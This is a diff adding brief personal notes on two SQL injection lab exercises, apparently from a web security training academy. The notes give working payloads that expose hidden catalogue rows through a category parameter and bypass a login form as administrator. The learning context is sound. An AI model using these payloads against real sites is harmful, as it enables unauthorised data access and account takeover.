@@ -1,0 +1,12 @@
+=> SLQi in category parameter lead to retrive hidden data in URL: https://0a83008604b960d582b82eb9002a0050.web-security-academy.net/filter?category=Gifts
+
+1. add single quote ' return an internal error so might be vuln to SQLi => filter?category=Gifts' => internal error
+2. retrieve hidden data via this payload ' OR 1=1 -- - => filter?category=Gifts' or 1=1 -- -
+
+
+
+
+=> SQLi in login portal: https://0a7300d604cb5b4d80fd58df006f002e.web-security-academy.net/login allowing bypass authentication 
+1. enter this payload in login form ' OR 1=1 -- will be login as administrator automatically
+OR
+1. in username filed enter this payload administrator'-- - => will login as admin also
